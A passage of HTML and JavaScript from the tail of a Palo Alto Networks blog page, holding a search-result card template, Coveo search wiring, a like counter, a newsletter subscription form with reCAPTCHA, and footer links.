                <% } %>

                <div class="feed-card-content">
                <p class="label">
                <%  _.each(raw.articlecategory,function(item,key,list) { %> <a <% if(typeof raw.articlepostid == "undefined"){print(' target="_blank"');} %>  href="<% if(typeof raw.articleauthorimagelink !== "undefined"){ print(raw.articlecategorylink[key]); } else{ print("#");}  %>" class="author url fn" rel="author"><%= item %></a><%if (key+1 < raw.articlecategory.length) { %>,<%  } %><%  }); %>
                            </p>
                  <h3><a <% if(typeof raw.articlepostid == "undefined"){print(' target="_blank"');} %> class="CoveoResultLink"><% var title_article = title.substr(0,75); print(title_article); var title_length = title.length; if(title_length > 75){print("...")} %></a></h3>
                  </div>
                  
                  <div class="feed-card-metadata">
			<div class="metadata-thumbnail">
			<div class="metadata-thumbnail-author">
	  		<img src="<% if(typeof raw.articleauthorimagelink !== "undefined"){ var image_link = raw.articleauthorimagelink[0]; if(image_link.indexOf("unit42.paloaltonetworks.com") != -1 ){ print("https://blog.paloaltonetworks.com/wp-content/themes/PaloAltoNetworksBlog/dist/images/unit42-logo1.jpg");} else{ print(image_link);} }else{ print("https://blog.paloaltonetworks.com/wp-content/uploads/2016/10/Social_BlogIcon_10.13.16.png"); } %>" width="75" height="75" alt="Avatar" class="avatar avatar-75 wp-user-avatar wp-user-avatar-75 photo avatar-default">			</div>
		</div>
		
		<div class="metadata-author">
                    <span class="author-name">
				By <%  _.each(raw.articleauthor,function(item,key,list) { %> <a <% if(typeof raw.articlepostid == "undefined"){print(' target="_blank"');} %> title="Posts by <%= item %>" href="<%= raw.articleauthorlink[key] %>" class="author url fn" rel="author"><%= item %></a><%if (key+1 < raw.articleauthor.length) { %><%if (key+1 == raw.articleauthor.length-1) { %> and <% } else { %>,<% } } %><%  }); %>                        <br>
                        <time datetime="<%= raw.articlepublishedtimestring %>"><%= raw.articlepublishedtimestring %></time>
                        <br>
                       <% if(typeof raw.articlepostlength !== "undefined"){ print(Math.ceil(raw.articlepostlength/200) + " min. read"); } %>
                    
                    </span>
		</div>
    <div class="metadata-likes ldc-ul_cont idc_ul_cont_not_liked" onclick="<%  print("alter_ul_post_values(this,'"+ raw.articlepostid +"','like')"); %>">
        
        <svg class=" " width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4.74998 15.9999H2.49999C2.10217 15.9999 1.72064 15.8419 1.43934 15.5606C1.15803 15.2793 1 14.8977 1 14.4999V9.24995C1 8.85213 1.15803 8.4706 1.43934 8.18929C1.72064 7.90799 2.10217 7.74996 2.49999 7.74996H4.74998M9.99994 6.24997V3.24999C9.99994 2.65325 9.76289 2.08096 9.34094 1.65901C8.91898 1.23705 8.34669 1 7.74996 1L4.74998 7.74996V15.9999H13.2099C13.5717 16.004 13.9227 15.8772 14.1983 15.6429C14.474 15.4086 14.6557 15.0826 14.7099 14.7249L15.7449 7.97496C15.7775 7.75997 15.763 7.54047 15.7024 7.33165C15.6418 7.12283 15.5365 6.92968 15.3938 6.7656C15.2511 6.60151 15.0745 6.47041 14.8761 6.38138C14.6777 6.29234 14.4623 6.2475 14.2449 6.24997H9.99994Z" stroke="#727272" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span class="<%  print("article-like-id"+raw.articlepostid);  %>"></span></span>
        
    </div>
	
</div>
              </article>
          </script>
          
                </div>     
                      <div class="col">
	
          <div class="loadmore text-center loadmore_main" style="display: none;">
      <button type="button" class="btn  load_more_btn" data-firstres="0">Load more</button>
    </div>
                    </div>
                      <div class="container" style="display: none;">
  
               

    <!-- Each DOM element with a class starting with "coveo-" (lowercase) is for CSS or alignment purpose only. -->
    <div class='coveo-search-section'>
      <div class="coveo-results-column">
        <!--selected breadcrumb-->
        <div class="CoveoBreadcrumb">
          <div class="coveo-breadcrumb-clear-all" title="Clear All Filters" tabindex="0">
            <div class="coveo-icon coveo-breadcrumb-icon-clear-all"></div>
            <div>Clear </div>
          </div>
        </div>
        <span class="CoveoSort coveo-sort-selection" data-sort-criteria="@articlepublishedtime descending" data-caption="Date"></span>
        <div class="coveo-results-header">
          <div class="coveo-summary-section">
            <span class="CoveoQuerySummary"></span>
          </div>
        </div>
      </div>
    </div>
                      </div>
      
          
            </div>
        </div>            
    </div>
</div>
</div>

<script type="text/javascript">
    document.write(str_subscription);
</script>
<section class="pan-mega-footer">
    <div class="container">
        <div class="row pan-mega-footer-links">
            <div class="col-xs-12 col-sm-4 col-md-3">
                <div class="footerTitle1 title baseComponent parbase">
                    <p>Popular Resources</p>
                </div>
                <div class="footerList1 list baseComponent parbase">
                    <ul class=" list-unstyled">
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Blog" href="https://blog.paloaltonetworks.com/">Blog</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Careers" href="https://jobs.paloaltonetworks.com/">Careers</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Communities" href="https://www.paloaltonetworks.com/communities">Communities</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Content Library" href="https://www.paloaltonetworks.com/resources">Content Library</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Cyberpedia" href="https://www.paloaltonetworks.com/cyberpedia">Cyberpedia</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Event Center" href="https://events.paloaltonetworks.com">Event Center</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Investors" href="https://investors.paloaltonetworks.com/investor-relations/overview/default.aspx">Investors</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Tech Docs" href="https://docs.paloaltonetworks.com/">Tech Docs</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Unit 42" href="https://unit42.paloaltonetworks.com/">Unit 42</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Popular Resources:Sitemap" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="col-xs-12 col-sm-4 col-md-3">
                <div class="footerTitle2 title baseComponent parbase">
                    <p>Legal Notices</p>
                </div>
                <div class="footerList2 list baseComponent parbase">
                    <ul class=" list-unstyled">
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Legal Notices:Privacy" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Legal Notices:Trust Center" href="https://www.paloaltonetworks.com/legal-notices/trust-center">Trust Center</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Legal Notices:Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a>
                        </li>
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Legal Notices:Documents" href="https://www.paloaltonetworks.com/legal">Documents</a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="col-xs-12 col-sm-4 col-md-3">
                <div class="footerTitle3 title baseComponent parbase">
                    <p>Account</p>
                </div>
                <div class="footerList3 list baseComponent parbase">
                    <ul class=" list-unstyled">
                        <li>
                            <a class="" data-page-track="true" data-page-track-value="footer:Account:Manage Subscriptions" href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a>
                        </li>
                    </ul>
                </div>
                <div class="vulnerabilityHtml html baseComponent parbase">
                    <div style="margin-top: 30px">
                        <a href="https://www.paloaltonetworks.com/security-disclosure" style="color: #C63F24; font-family: Arial,sans-serif; font-size: 14px; font-style: normal; font-weight: normal; line-height: normal">Report a Vulnerability</a>
                    </div>
                </div>
            </div>
            <div class="col-xs-12 col-sm-12 col-md-3 footer-social-col">
                <div class="content">                
                    <ul class="list-inline">
                        <li class="list-inline-item">
                            <a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank"><img alt="Facebook" class="lozad" data-loaded="true" data-src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Facebook-black.svg" src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Facebook-black.svg"></a>
                        </li>
                        <li class="list-inline-item">
                            <a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank"><img alt="Linkedin" class="lozad" data-loaded="true" data-src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Linkedin-black.svg" src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Linkedin-black.svg"></a>
                        </li>
                        <li class="list-inline-item">
                            <a href="https://twitter.com/PaloAltoNtwks" target="_blank"><img alt="Twitter" class="lozad" data-loaded="true" data-src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Twitter-black.svg" src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Twitter-black.svg"></a>
                        </li>
                        <li class="list-inline-item">
                            <a href="https://www.youtube.com/user/paloaltonetworks" target="_blank"><img alt="Youtube" class="lozad" data-loaded="true" data-src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Youtube-black.svg" src="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/svg/Youtube-black.svg"></a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</section>
<footer class="pan-footer">
    <div class="container">
        <span><p>&copy; 2020 Palo Alto Networks, Inc. All rights reserved.<br></p>
        </span>
    </div>
</footer>
<div class="CoveoSearchbox" data-enable-search-as-you-type="false" data-enable-omnibox="true" data-omnibox-timeout="1000" data-placeholder="Search the blog" data-enable-query-suggest-addon="false" data-trigger-query-on-clear="true" id="pan-coveo-input" style="display: none;"></div>



<script type="text/javascript">
    jQuery('body').attr('data-pipeline', "New Research Center Pipeline");
    var timerIsCoveoDefined = '';
    var resultTotalCount;
    //var root = document.getElementById('coveo-container');
    var root = document.body;
    var isloadCoveoLibraryCalled = false;
    var screenwidth = window.screen.width;
    var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
    var topSearch = true;
    //Coveo code
    function loadCoveoLibrary() {
        if (isloadCoveoLibraryCalled) {
            return;
        }
        isloadCoveoLibraryCalled = true;
        $.getScript("https://static.cloud.coveo.com/searchui/v2.3679/js/CoveoJsSearch.Lazy.min.js");
        timerIsCoveoDefined = setInterval(isCoveoDefined, 1000);
    }
    function isCoveoDefined() {
        if (typeof Coveo !== 'undefined') {
            console.log("Coveo object is now defined.")
            executeCoveoSearch();
            clearInterval(timerIsCoveoDefined);
            $('#postSearch1, #postSearch2').attr('title', '');
            $('#postSearch1, #postSearch2').prop("readonly", false);
            $('.dropdown-menu a').css('pointer-events','auto');
        }
    }
    function executeCoveoSearch() {

        var settings = {
            "async": false,
            "url": "https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/coveosearch.getaccesstoken.php",
            //"url": "https://www.paloaltonetworks.com/apps/pan/public/coveosearch.getaccesstoken.json",
            "method": "GET",
        }


        jQuery.ajax(settings).done(function (response) {

            Coveo.SearchEndpoint.endpoints['default'] = new Coveo.SearchEndpoint({
                restUri: 'https://platform.cloud.coveo.com/rest/search',
                queryStringArguments: {
                    organizationId: 'paloaltonetworksintranet'                    
                },
                accessToken: response.token
            });
            Coveo.$$(root).on("querySuccess", function (e, data) {
                //console.log(data.query.q);
                if(!$('#searching').val()){
                    topSearch = false;
                }
                
                if(topSearch){
                    $([document.documentElement, document.body]).animate({
                        scrollTop: 0 
                    }, 1000);
                }
                
                if(topSearch){
                    $('nav.navbar li a.active').removeClass('active');
                }
                resultTotalCount = data.results.totalCount;
                //document.title = "Palo Alto Networks Blog";
                /*
                if(resultTotalCount > 0){
                    $('#search-result-heading .search-term').text(capitalizeFirstLetter(data.query.q));
                    $('#search-result-heading').show();
                }
                else{
                    $('#search-result-heading').hide();
                    $('#search-result-heading .search-term').text('');
                }
                */

            });
            Coveo.$$(root).on("newResultsDisplayed", function (e, args) {
                $('#ajax_loader').hide();
                $('#notfound2').hide();
                $('.load_more_btn').html('Load more');
                $('.load_more_btn').prop('disabled', false);
                $('.CoveoResult').addClass('col-xs-12 col-sm-6 col-md-6 col-lg-4 col-xl-4 col-feed-card grid-item');
                var article_ids = new Array();
                jQuery.each(jQuery('.pan-coveo-search-list'), function (i) {
                    var article_id_tmp = $(this).data("article-id");
                    if (article_id_tmp != '' && !jQuery(this).hasClass('num-like-retrieved')) {
                        article_ids.push(article_id_tmp);
                    }
                    if (article_id_tmp != '') {
                        //If this article is liked, make the thumb icon to blue
                        var article_liked_list = [];
                        var like_found = $.inArray(article_id_tmp, article_liked_list);
                        if (like_found != -1) {
                            $(this).find('.ldc-ul_cont').find('svg').children('path').attr('stroke', '#FF2E00');
                            $(this).find('.ldc-ul_cont').removeClass('idc_ul_cont_not_liked');
                        }
                    }
                });
                if (article_ids.length > 0) {
                    var saveData = $.ajax({
                        type: 'POST',
                        url: wp_vars.ajax_url,
                        data: {action: 'fetch_total_article_likes', article_ids_arr: JSON.stringify(article_ids)},
                        dataType: "json",
                        success: function (resultData) {
                            //var article_likes = JSON.parse(resultData);
                            jQuery.each(article_ids, function (i, val) {
                                $('.article-like-id' + val).text(resultData[val][0]);
                                //$('.people-reacted'+val).text(resultData[val][1]);
                                $('.article-like-id' + val).closest(".pan-coveo-search-list").addClass('num-like-retrieved');
                            });
                        }
                    });
                }
                //console.log($('.CoveoResult').length +'|'+ resultTotalCount);
                //console.log(Coveo.state(root, 'first'));
                if ($('.CoveoResult').length >= resultTotalCount) {
                    $('.load_more_btn').hide();
                } else {
                    $('.load_more_btn').show();
                }
                if (resultTotalCount <= 0) {
                    $('#notfound2').show();
                } else {
                    $('#notfound2').hide();
                }
                
                if (jQuery('.magic-box-input input').val() || $('.CoveoResult').length >= 1) {
                    if(topSearch){
                        jQuery('#main-container').hide();
                        $('#inner_cards').show();
                        jQuery('.loadmore_main2').hide();
                        jQuery('#search-result-continer').show();
                        jQuery('.loadmore_main').show();
                        $('#main-container .container-feed-cards .container-lg').removeAttr('style');
                        $('#search-result-continer .container-feed-cards .container-lg').removeAttr('style');
                    }
                    else{
                        jQuery('#main-container').show();
                        $('#inner_cards').hide();
                        jQuery('.loadmore_main2').hide();
                        jQuery('#search-result-continer').show();
                        jQuery('.loadmore_main').show();
                        $('#main-container .container-feed-cards .container-lg').attr('style','padding-bottom: 0;');
                        $('#search-result-continer .container-feed-cards .container-lg').attr('style','padding-top: 0;');
                    }
                } else {
                    jQuery('#search-result-continer').hide();
                    jQuery('.loadmore_main').hide();
                    $('#inner_cards').show();
                    jQuery('#main-container').show();
                    jQuery('.loadmore_main2').show();
                }
            });
            //Coveo.state(root, 'numberOfResults',9);
            //Coveo.state(Coveo.$$(document).find(".magic-box-input input"), 'f:@articlecategory' , 'Secure the Cloud');
            Coveo.SearchInterface.options.autoTriggerQuery.defaultValue = false;
            Coveo.init(root);
        });
    }

    $('body').on('blur', '.magic-box-input input, #postSearch1', function (e) {
        var has_hash = false;
        if (window.location.hash.length) {
            has_hash = true;
        }
        var to_append = '';
        if (has_hash) {
            to_append = window.location.hash.replace('#', '');
            to_append = '#' + to_append;
        }
        window.history.replaceState(null, null, "?search_field=" + $(this).val() + to_append);
    });

    $('.load_more_btn').on('click', function () {
        //Coveo.SearchEndpoint.endpoints["default"].options.queryStringArguments.numberOfResults = 8;
        load_more_clicked = true;

        var this_btn = $(this);
        $(this).addClass('is-clicked');
        $(this).html('Loading...');
        $(this).prop('disabled', true);
        //jQuery('.articles_container').masonry('reloadItems').masonry();
        //Coveo.SearchEndpoint.endpoints["default"].options.queryStringArguments.numberOfResults = 8;
        //Coveo.state(root, 'firstResult',$('.CoveoResult').length - 1);
        Coveo.$('.CoveoResultList').coveo('displayMoreResults', 9);
        //Coveo.SearchEndpoint.endpoints["default"].options.queryStringArguments.numberOfResults = 9;
        setTimeout(function () {
            this_btn.removeClass('is-clicked');
        }, 1900);
    });
    var interval;
    var timer2;

    if (isIE11) {
        executeCoveoSearch();
    }




    var captcha_rendered = false;
    var subscribeSuccess = false;

    jQuery('body').on('change paste keyup', '.business_email_bot', function () {
        jQuery(this).closest('form').find('.google-recapth').removeClass('d-none');
    });

    $('body').on('mouseover', '.idc_ul_cont_not_liked', function (e) {
        $(this).find('svg').children('path').attr('stroke', '#FF2E00');
        //$(this).attr('src','https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/blue-like-icon.png');
    });
    $('body').on('mouseout', '.idc_ul_cont_not_liked', function (e) {
        $(this).find('svg').children('path').attr('stroke', '#727272');
        //$(this).attr('src','https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/images/grey-like-icon.png');
    });




    $(document).ready(function () {
        getSerializedTracking("Unit42_Subscribe");

    });
    $('body').click(function () {
        $('.CoveoDidYouMean').hide();
    });

    jQuery('body').on('change paste keyup', '.business_email', function () {
        //console.log($('#captcha_container2').children().length);
        if ($('#captcha_container').length == 1 && $('#captcha_container').children().length == 0) {
            console.log("cap1");
            var loadCaptcha = function () {
                captchaContainer = grecaptcha.render('captcha_container', {
                    'sitekey': '6LeyHGkUAAAAAEwfqwKWxNqdht3xjSNf-j3bK7l2',
                    'callback': function (response) {
                        $("form[name='Unit42_Subscribe'] button[type='submit']").prop('disabled', false);
                        subscribeSuccess = true;
                    },
                    'expired-callback' : function(){
                        $("form[name='Unit42_Subscribe'] button[type='submit']").prop('disabled', true);
                        subscribeSuccess = false;
                    }
                });
            }
            loadCaptcha();
        }
        /*
        if ($('#captcha_container2').length == 1 && $('#captcha_container2').children().length == 0) {
            console.log("cap2");
            var loadCaptcha2 = function () {
                captchaContainer = grecaptcha.render('captcha_container2', {
                    'sitekey': '6LeyHGkUAAAAAEwfqwKWxNqdht3xjSNf-j3bK7l2',
                    'callback': function (response) {
                        $("form[name='contact_sales_modal'] input[type='submit']").prop('disabled', false);
                        subscribeSuccess = true;
                    }
                });
            }

            loadCaptcha2();
        }
        */
        setTimeout(function () {
            jQuery('#row-recatcha').removeClass('d-none');
            //jQuery('.articles_container').masonry('layout');
        }, 50);
    });


    jQuery('body').on('submit', 'form.subscribe-form', function () {
        var success = true;
        var form = jQuery(this);
        var mail = form.find('input[name="Email"]');
        if (mail.val() === '' || !isEmail(mail.val())) {
            mail.closest("form").addClass('has-error');
            success = false;
        } else {
            mail.closest("form").removeClass('has-error');
        }

        if (success && subscribeSuccess) {
            $.ajax({
                type: 'POST',
                url: form.attr('action'),
                data: form.serialize(),
                success: function (msg) {
                    form.html('<p style="color: #0c6;">You have been successfully subscribed</p>');
                    //masonry.masonry('layout');
                }
            });
        }
        return false;
    });


    function isEmail(email) {
        var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(String(email).toLowerCase());
    }


    $(document).ready(function () {
        //$('body').attr('data-results-per-page', '9');
        $("#dropdownMenuButton").click(function(){
            if (typeof Coveo === 'undefined') {
                //$(".dropdown-menu a").attr('disabled',"disabled");
                $('.dropdown-menu a').css('pointer-events','none');
                loadCoveoLibrary();
            }
        });
        
        $(".dropdown-menu a").click(function(e){
            $(this).parents(".dropdown").find('.btn').html($(this).text());
            $(this).parents(".dropdown").find('.btn').val($(this).data('value'));
            topSearch = false;
            e.preventDefault(); 
        });
        
        /**
         $('img').each(function() {
         var path = $(this).attr('src');
         $(this).attr('src', path.replace("http://blog-localhost.paloaltonetworks.com/wp-content/upload", "https://blog.paloaltonetworks.com/wp-content/upload"));
         });
         $('figure').each(function() {
         var path = $(this).attr('style');
         if (typeof path !== 'undefined'){
         $(this).attr('style', path.replace("http://blog-localhost.paloaltonetworks.com/wp-content/upload", "https://blog.paloaltonetworks.com/wp-content/upload"));
         }
         });
         * 
         */
        
        $(".pan-page-alert-close").click(function(){
            $("#nav-mobile").css("top", "72px");
          });
          $("#feed-clear").click(function(){
              //$('#mostRecentTab').trigger('click');
            $('#postSearch2').val('');
            $('#sec-search-clear').hide();
            jQuery('#search-result-continer').hide();
            jQuery('.loadmore_main').hide();
            $('#inner_cards').show();
            jQuery('#main-container').show();
            jQuery('.loadmore_main2').show();
            $('#main-container .container-feed-cards .container-lg').removeAttr('style');
            
            
            $('.col-feed-filter #dropdownMenuButton').val("Most Recent");
            $('.col-feed-filter #dropdownMenuButton').html("Most Recent");
            $('#mostRecentTab').addClass('coveo-selected');
            $('#mostPopularTab').removeClass('coveo-selected');
         
            
          });
          

        $('#postSearch2').focus(function () {
            if (typeof Coveo === 'undefined') {
                //$('#postSearch1, #postSearch2').attr('title', 'Loading...please wait');
                $('#postSearch1, #postSearch2').prop("readonly", true);
                loadCoveoLibrary();
            }
        });
        $('body').on('keyup', '#postSearch1, #postSearch2', function (e) {
            //cur_search_txt = jQuery('.magic-box-input input').val(); 
            if(this.id == 'postSearch2'){
                topSearch = false;
            }
            else{
                topSearch = true;
            }
            var typed_text;
            if(topSearch){
                typed_text = $('#postSearch1').val();
            }
            else{
                typed_text = $('#postSearch2').val();
                if((typed_text.length > 0) ){
                    $('#sec-search-clear').show();
                    //$('#feed-search').prop('disabled', false);
                }
                else{
                    $('#sec-search-clear').hide();
                    //$('#feed-search').prop('disabled', true);
                }
            }
            
            
            $('.magic-box-input input').val(typed_text);
            if ((typed_text.length > 0) && e.keyCode === 13) {
                if(topSearch && !$('#searching').val()){
                    location.href='https://blog.paloaltonetworks.com?search_field='+typed_text;
                    return;
                }
                //enterKeyPressed = true;
                if (screenwidth < 992) {
                    if(topSearch){
                    mobileToggle();
                }
                }
                $('.CoveoSearchButton').click();
            }
        });
    });
</script>


    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://blog.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#FA582D');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <script type='text/javascript'>
/* <![CDATA[ */
var wpcf7 = {"apiSettings":{"root":"https:\/\/blog.paloaltonetworks.com\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/plugins/contact-form-7/includes/js/scripts.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/popper.min.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/bootstrap.min.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/aos.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wp_vars = {"ajax_url":"https:\/\/blog.paloaltonetworks.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/masonry2.js?v2'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/dist/scripts/jquery.cookie.js'></script>
<script type='text/javascript' src='https://blog.paloaltonetworks.com/wp-includes/js/wp-embed.min.js'></script>
  </body>
</html>

